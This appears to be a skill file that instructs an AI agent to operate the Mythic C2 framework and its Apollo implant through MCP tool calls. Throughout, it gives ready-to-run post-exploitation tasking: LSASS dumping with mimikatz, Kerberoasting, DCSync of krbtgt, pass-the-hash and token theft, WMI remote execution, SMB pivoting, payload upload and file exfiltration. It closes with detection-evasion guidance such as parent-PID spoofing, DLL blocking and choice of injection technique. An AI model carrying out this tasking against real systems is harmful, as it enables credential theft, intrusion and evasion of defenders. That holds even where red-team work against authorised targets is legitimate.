---
name: mythic-apollo
description: Mythic C2 with Apollo implant — post-exploitation methodology. Use when operating callbacks, running implant commands, performing credential access, lateral movement, or any Mythic tasking.
---

# Mythic + Apollo Post-Exploitation

## Orientation (do this first)

1. `get_callbacks()` — list active callbacks, note display IDs
2. `whoami(callback_id)` — confirm user context
3. `pwd(callback_id)` / `ls(callback_id)` — confirm working directory
4. `ps(callback_id)` — survey running processes, identify security products
5. `ifconfig(callback_id)` / `netstat(callback_id)` — map network position

Every command takes `callback_id` — the display ID from `get_callbacks`.

## MCP Tools vs Apollo Commands

Our MCP server exposes **47 typed tools** for the most common operations. Apollo has **73+ commands** total. For commands without a dedicated MCP tool, use:

```python
_execute(callback_id, command="<apollo_command>", args="<arguments>")
```

Read the command reference docs at `docs/apollo/commands/<command>.md` for args and usage.

### Commands only available via _execute

Injection: `inject`, `assembly_inject`, `psinject`, `shinject`, `keylog_inject`, `screenshot_inject`
Execution: `shell`, `run`, `execute_coff`, `execute_pe`, `inline_assembly`
C2/Pivoting: `link`, `unlink`, `socks`, `spawn`, `sleep`, `exit`
Credential: `dcsync`, `ticket_cache_*`, `ticket_store_*`
Evasion: `ppid`, `blockdlls`, `get_injection_techniques`
Service: `sc`, `kill`, `listpipes`, `load`, `register_coff`, `register_file`
File: `mkdir`, `mv`, `rm`, `screenshot`

## Methodology

### Credential Access

**Dump LSASS** (requires SYSTEM or SeDebugPrivilege):
```
getprivs(callback_id)
mimikatz(callback_id, commands="token::elevate sekurlsa::logonpasswords")
```

**Kerberoast** (requires domain user creds):
```
rubeus_kerberoast(callback_id, cred_user="DOMAIN\\user", cred_password="pass")
```

**AS-REP Roast**:
```
rubeus_asreproast(callback_id)
```

**DCSync** (requires Replicating Directory Changes privileges):
```
_execute(callback_id, command="dcsync", args={"domain": "domain.local", "user": "krbtgt"})
```

**Kerberos tickets**:
```
_execute(callback_id, command="ticket_cache_list", args="")
_execute(callback_id, command="ticket_cache_extract", args="")
```

### Lateral Movement

**Pass-the-Hash** → creates new process with target creds:
```
pth(callback_id, domain="domain.local", username="admin", ntlm_hash="aad3b...")
```
Then `steal_token` from the spawned process to assume that identity.

**Token manipulation flow**:
1. `pth(...)` or `make_token(...)` — get a token
2. `steal_token(callback_id, pid=<spawned_pid>)` — impersonate it
3. Do lateral work (WMI, file access, etc.)
4. `rev2self(callback_id)` — revert when done

**WMI execution** on remote host:
```
wmiexecute(callback_id, command="cmd.exe /c whoami", host="target", username="admin", password="pass", domain="DOMAIN")
```

**P2P agent linking** (SMB/TCP pivots):
```
_execute(callback_id, command="link", args={"host": "target.domain.local", "payload": "Apollo_SMB.exe"})
```

### AD Enumeration

**PowerView** (auto-uploads and imports PowerView.ps1):
```
powerview(callback_id, command="Get-DomainUser -AdminCount")
powerview(callback_id, command="Get-DomainComputer -Unconstrained")
powerview(callback_id, command="Find-DomainShare -CheckShareAccess")
```

With alternate creds:
```
powerview(callback_id, command="Get-DomainUser", credential_user="admin", credential_password="pass", domain="DOMAIN")
```

**SharpHound** (auto-uploads, runs, downloads results):
```
sharphound_and_download(callback_id, domain="domain.local")
```

**Network enumeration**:
```
net_dclist(callback_id, domain="domain.local")
net_localgroup(callback_id, computer="TARGET01")
net_localgroup_member(callback_id, group="Administrators", computer="TARGET01")
net_shares(callback_id, computer="TARGET01")
```

### Execution

**PowerShell** (leaves `powershell.exe` artifacts):
```
powershell(callback_id, arguments="Get-Process", timeout=30)
```

**PowerPick** (unmanaged PowerShell, fork-and-run — more OPSEC-safe):
```
powerpick(callback_id, arguments="Get-Process")
```

**Custom scripts** (upload → import → execute pipeline):
```
powershell_script(callback_id, entry_function="Invoke-MyTool", script="function Invoke-MyTool { ... }")
```

**.NET assemblies** (must register first):
```
register_assembly(callback_id, filename="Seatbelt.exe")
_execute(callback_id, command="execute_assembly", args="Seatbelt.exe -group=all")
```

Or use the composite tools: `seatbelt(callback_id)`, `adcollector(callback_id)`

### File Operations

```
cat(callback_id, path="C:\\Users\\admin\\Desktop\\flag.txt")
download(callback_id, path="C:\\secret.docx")                    # target → Mythic server
download_to_local_file(callback_id, path="C:\\secret.docx")      # target → Mythic → local
upload(callback_id, filepath="/tmp/payload.exe", target_host_path="C:\\Windows\\Temp\\svc.exe")
```

### Privilege Escalation

**PrintSpoofer** (if SeImpersonatePrivilege):
```
_execute(callback_id, command="printspoofer", args="")
```

**Token stealing**:
```
ps(callback_id)                                    # find high-priv process
steal_token(callback_id, pid=<target_pid>)         # impersonate
rev2self(callback_id)                              # revert
```

## OPSEC Notes

Read the full guides at `docs/apollo/opsec/`.

**Fork-and-run commands** spawn a sacrificial process — these generate Process Create + Process Inject + Process Kill artifacts:
`execute_assembly`, `mimikatz`, `powerpick`, `printspoofer`, `pth`, `dcsync`, `spawn`, `execute_pe`

**Change the sacrificial process** (default is `rundll32.exe` — very suspicious):
```
spawnto_x64(callback_id, application="C:\\Windows\\System32\\svchost.exe")
```

**Change parent PID** (avoid attribution to your implant):
```
_execute(callback_id, command="ppid", args="<pid_of_explorer_or_svchost>")
```

**Block non-Microsoft DLLs** in child processes:
```
_execute(callback_id, command="blockdlls", args="")
```

**Injection technique** — Apollo supports CreateRemoteThread, QueueUserAPC (early bird), NtCreateThreadEx (syscalls). QueueUserAPC is incompatible with some inject commands:
```
_execute(callback_id, command="get_injection_techniques", args="")
set_injection_technique(callback_id, technique="NtCreateThreadEx")
```

**Prefer `powerpick` over `powershell`** — powerpick uses an unmanaged runspace (no `powershell.exe` process creation).

**Prefer `execute_assembly` over `shell`** — in-memory execution avoids disk writes.

## Server-Side Operations

```
get_callbacks()                                           # list all callbacks
upload_file(filepath="/local/tool.exe", reupload=False)   # upload to Mythic server
check_file(filename="tool.exe")                           # verify file on server
download_file(filename="loot.zip")                        # download from server
```
